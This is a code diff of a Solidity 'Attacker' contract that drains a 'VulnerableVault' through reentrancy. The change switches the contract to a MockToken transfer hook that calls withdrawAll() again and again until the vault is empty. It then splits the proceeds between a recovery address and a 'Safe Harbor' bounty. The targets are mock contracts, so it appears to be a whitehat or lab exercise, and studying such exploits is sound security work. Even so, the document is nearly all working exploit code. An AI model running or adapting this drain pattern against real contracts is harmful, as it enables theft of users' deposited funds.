@@ -1,41 +1,36 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.24;
 
-import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
-
-/// @dev Callback interface the deployed token calls on contract recipients.
-interface ITokenReceiver {
-    function onTokenReceived(address from, uint256 amount) external;
-}
-
 interface IVulnerableVault {
     function deposit(uint256 amount) external;
     function withdrawAll() external;
-    function getBalance(address user) external view returns (uint256);
 }
 
-interface IMintable {
+interface IMockToken {
     function mint(address to, uint256 amount) external;
+    function approve(address spender, uint256 amount) external returns (bool);
+    function setTransferHook(address hook) external;
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
 }
 
 /// @title Attacker
 /// @notice Exploits the CEI violation in VulnerableVault via reentrancy.
 ///
 /// @dev ATTACK FLOW
-///      1. Mint seed tokens (MockToken is publicly mintable)
-///      2. Deposit seed tokens into VulnerableVault
-///      3. Call withdrawAll() — vault transfers tokens, triggering onTokenReceived
-///      4. In onTokenReceived, call withdrawAll() again (balance not cleared yet)
-///      5. Repeat until vault is empty
-///      6. Distribute recovered funds per Safe Harbor bounty terms
-contract Attacker is ITokenReceiver {
-    IVulnerableVault public immutable vault;
-    IERC20 public immutable token;
-    address public immutable recoveryAddress;
-    uint256 public immutable bountyBps; // basis points: 1000 = 10%
-    address public immutable owner;
-
-    bool private _attacking;
+///      1. Register this contract as a transfer hook on MockToken
+///      2. Mint seed tokens and deposit them into VulnerableVault
+///      3. Call withdrawAll() — vault transfers tokens via token.transfer()
+///      4. MockToken sees our hook and calls onTokenTransfer()
+///      5. In onTokenTransfer(), call withdrawAll() again (balance not yet cleared)
+///      6. Repeat until the vault is empty
+///      7. Distribute recovered funds per Safe Harbor bounty terms
+contract Attacker {
+    IVulnerableVault public immutable VAULT;
+    IMockToken public immutable TOKEN;
+    address public immutable RECOVERY_ADDRESS;
+    uint256 public immutable BOUNTY_BPS; // basis points: 1000 = 10%
+    address public immutable OWNER;
 
     constructor(
         address _vault,
@@ -43,48 +38,48 @@ contract Attacker is ITokenReceiver {
         address _recoveryAddress,
         uint256 _bountyBps
     ) {
-        vault = IVulnerableVault(_vault);
-        token = IERC20(_token);
-        recoveryAddress = _recoveryAddress;
-        bountyBps = _bountyBps;
-        owner = msg.sender;
+        VAULT = IVulnerableVault(_vault);
+        TOKEN = IMockToken(_token);
+        RECOVERY_ADDRESS = _recoveryAddress;
+        BOUNTY_BPS = _bountyBps;
+        OWNER = msg.sender;
     }
 
     /// @notice Called by MockToken.transfer() when this contract receives tokens.
     ///         This is the re-entry point — keep draining while the vault has funds.
-    function onTokenReceived(address, uint256) external override {
-        if (_attacking && token.balanceOf(address(vault)) > 0) {
-            vault.withdrawAll();
+    function onTokenTransfer(address, uint256) external {
+        if (TOKEN.balanceOf(address(VAULT)) > 0) {
+            VAULT.withdrawAll();
         }
     }
 
     /// @notice Execute the reentrancy attack.
     /// @param seedAmount Tokens to deposit as the initial attack seed.
     function attack(uint256 seedAmount) external {
-        require(msg.sender == owner, "Attacker: only owner");
+        require(msg.sender == OWNER, "only owner");
+
+        // Register ourselves as a transfer hook — whenever this contract
+        // receives tokens, MockToken will call our onTokenTransfer()
+        TOKEN.setTransferHook(address(this));
 
         // Mint seed tokens — MockToken allows anyone to mint
-        IMintable(address(token)).mint(address(this), seedAmount);
-
-        _attacking = true;
+        TOKEN.mint(address(this), seedAmount);
 
         // Deposit seed tokens to establish a vault balance
-        token.approve(address(vault), seedAmount);
-        vault.deposit(seedAmount);
+        TOKEN.approve(address(VAULT), seedAmount);
+        VAULT.deposit(seedAmount);
 
-        // First withdrawal triggers the reentrancy chain via onTokenReceived
-        vault.withdrawAll();
-
-        _attacking = false;
+        // First withdrawal triggers the reentrancy chain via onTokenTransfer
+        VAULT.withdrawAll();
 
         // ── Safe Harbor fund distribution ──────────────────────────────────
         // Return recovered funds to the protocol's recovery address,
         // keeping only the agreed bounty percentage.
-        uint256 total = token.balanceOf(address(this));
-        uint256 bounty = (total * bountyBps) / 10_000;
+        uint256 total = TOKEN.balanceOf(address(this));
+        uint256 bounty = (total * BOUNTY_BPS) / 10_000;
         uint256 toReturn = total - bounty;
 
-        token.transfer(recoveryAddress, toReturn);
-        token.transfer(owner, bounty);
+        TOKEN.transfer(RECOVERY_ADDRESS, toReturn);
+        TOKEN.transfer(OWNER, bounty);
     }
 }
